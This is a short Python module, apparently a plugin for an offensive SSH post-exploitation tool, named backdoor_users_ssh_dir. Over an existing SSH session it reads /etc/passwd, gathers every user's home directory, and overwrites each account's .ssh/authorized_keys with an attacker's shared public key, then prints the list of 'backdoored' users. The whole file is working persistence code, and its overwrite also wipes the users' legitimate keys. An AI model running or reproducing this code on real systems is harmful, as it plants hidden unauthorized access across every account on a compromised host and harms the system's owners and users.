import logging
from hyderaddons import bcolors, ModuleBaseClass, shared_pub_key

class BackdoorUsersSshDir:

    name = "backdoor_users_ssh_dir"
    description = """Gathers user directories from /etc/passwd. Then, it creates
.ssh directory for each of them and creates/overwrites .ssh/authorized_keys file
with the public key defined in hyderaddons.shared_pub_key
"""
    safe = False

    def run(self, sshclient, args, server):
        logging.debug("Using this public ssh key: %s" % shared_pub_key)
        logging.debug("Gathering users home folder from /etc/passwd")
        _, stdout, _ = sshclient.exec_command("cat /etc/passwd")
        stdout = stdout.read().decode().strip().split("\n")
        homes = []
        for line in stdout:
            line_split = line.split(":")
            if line_split[5]:
                homes.append([line_split[0], line_split[5]])
        cmd = '''mkdir -p %s/.ssh; echo """%s""" > %s/.ssh/authorized_keys'''
        for home in homes:
            sshclient.exec_command(cmd % (home[1], shared_pub_key, home[1]))
        print("Backdoored home folders (added SSH shared key to authorized_keys)")
        print("Users backdoored: " + bcolors.red(",".join([x[0] for x in homes])))
        return True
